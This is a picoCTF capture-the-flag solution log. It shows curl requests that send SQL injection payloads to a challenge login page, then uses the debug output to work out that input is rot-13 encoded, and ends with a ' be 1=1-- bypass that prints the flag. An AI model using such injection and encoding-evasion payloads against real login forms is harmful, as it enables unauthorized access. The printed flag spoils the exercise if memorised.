'''
curl "https://jupiter.challenges.picoctf.org/problem/54253/login.php" --data "password='+or+1=1--&debug=1" && echo
<pre>password: ' or 1=1--
SQL query: SELECT * FROM admin where password = '' be 1=1--'
</pre>

##!! or -> be, rot-13

curl "https://jupiter.challenges.picoctf.org/problem/54253/login.php" --data "password=abcdefghijklmnopqrstuvwxyz'+and+1=1--&debug=1" && echo
<pre>password: abcdefghijklmnopqrstuvwxyz' and 1=1--
SQL query: SELECT * FROM admin where password = 'nopqrstuvwxyzabcdefghijklm' naq 1=1--'

##!! abcdefg...->nopqrst..., rot-13

curl "https://jupiter.challenges.picoctf.org/problem/54253/login.php" --data "password='+be+1=1--&debug=1" && echo
<pre>password: ' be 1=1--
SQL query: SELECT * FROM admin where password = '' or 1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>
'''
